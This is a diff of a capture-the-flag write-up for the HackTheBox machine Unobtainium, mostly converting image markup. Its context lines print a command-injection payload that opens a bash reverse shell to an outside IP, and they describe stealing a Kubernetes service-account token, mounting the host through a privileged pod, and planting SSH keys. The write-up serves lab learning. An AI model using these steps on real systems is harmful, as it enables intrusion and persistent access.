@@ -58,13 +58,13 @@ PORT      STATE SERVICE       VERSION
 
 Visting the web page shows us this:
 
-<figure><img src="../../../.gitbook/assets/image (2744).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2744).png>)
 
 When any of the links are clicked, we can download a zip file for an application. Not too sure what we can do with this at the moment.
 
 We can see from the `nmap` scan above that there is some kind of Kubernetes application being run on port 8443. When trying to view it, all we get is a 401 Unauthorized error from the API.
 
-<figure><img src="../../../.gitbook/assets/image (3250).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3250).png>)
 
 ### Deb File Analysis
 
@@ -85,11 +85,10 @@ data.tar.xz     unobtainium_1.0.0_amd64.deb  unobtainium_debian.zip
 
 We can first use `gunzip` and `tar` to extract the `control.tar.gz` files. Within it, we can find a few other files.
 
-<figure><img src="../../../.gitbook/assets/image (2905).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2905).png>)
 
 Interesting. We can take a look at the content within these folders.
 
-{% code title="control" %}
 ```
 $ cat control
 Package: unobtainium
@@ -106,7 +105,6 @@ Homepage: http://unobtainium.htb
 Description: 
   client
 ```
-{% endcode %}
 
 Seems that there is a user named `felamos` and this is some metadata of the program. The other files are bash scripts. The `postinst` file contained some hints about Electron 5+.
 
@@ -136,11 +134,11 @@ rm -f '/usr/bin/unobtainium'
 
 Using `xz -d` and `tar xvf` on the `data.tar.xz` file revealed lots of files pertaining to the application.
 
-<figure><img src="../../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(620).png>)
 
 Amongst all the files mentioned, it appears that the source code was within the `./opt/unobtainium/resources/app.asar` directory of the folder. We can decompile this file using `npx asar`.
 
-<figure><img src="../../../.gitbook/assets/image (2530).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2530).png>)
 
 Then, we can begin our source code analysis
 
@@ -323,7 +321,7 @@ So to craft our exploit, we need to find out what information the JSON object mu
 
 The final request I sent looked like this:
 
-<figure><img src="../../../.gitbook/assets/image (3236).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3236).png>)
 
 Afterwards, I was able to upload files to the server:
 
@@ -339,7 +337,7 @@ $ curl -H "Content-Type: application/json" -X POST -d '{"auth": {"name": "felamo
 {"ok":true,"Uploaded_File":"& bash -c \"bash -i >& /dev/tcp/10.10.14.17/443 0>&1\""}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3471).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3471).png>)
 
 ## Privilege Escalation
 
@@ -353,7 +351,7 @@ I found this page rather useful.
 
 It appears that we can get a token from the `/run/secrets/kubernetes.io/serviceaccount` folder to interact with the API. Within that file, we can find a `ca.crt` and `token` file.
 
-<figure><img src="../../../.gitbook/assets/image (406).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(406).png>)
 
 Using this in conjunction with `kubectl` reveals that we can indeed talk to the API.
 
@@ -437,7 +435,7 @@ MAC Address: 6A:95:CB:8C:AB:5F (Unknown)
 
 Port 3000 is the default port where Express applications run on. Earlier, in our source code review, the application was found to be running on Express. I repeated the Prototype Pollution and RCE exploit I used earlier, and was able to receive a shell to the devnode.
 
-<figure><img src="../../../.gitbook/assets/image (2022).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2022).png>)
 
 ### Namespace Enumeration
 
@@ -529,7 +527,7 @@ As the administrator, one attack path we can do is to create a new pod that has 
 
 Essentially, we need to create a YAML file that has specifications on how our new pod would be like, and it's there that we can include the mount path. First, we need to find the images available on the machine. This c an be done with some basic commands.
 
-<figure><img src="../../../.gitbook/assets/image (3985).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3985).png>)
 
 At the very bottom, we can find and use `localhost:5000/dev-alpine`. Then we can create our YAML file and then a new pod with custom settings.
 
@@ -556,7 +554,7 @@ spec:
   hostNetwork: true
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2032).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2032).png>)
 
 Then we can connect to it directly using this command:
 
@@ -568,6 +566,6 @@ root
 
 Then we can capture the root flag. Afterwards, we can easily upgrade a shell into this machine. We can create an `authorized_keys` file and echo our public key in it.
 
-<figure><img src="../../../.gitbook/assets/image (2770).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2770).png>)
 
 Rooted! Really good machine for learning source code analysis and Kubernetes enumerations.
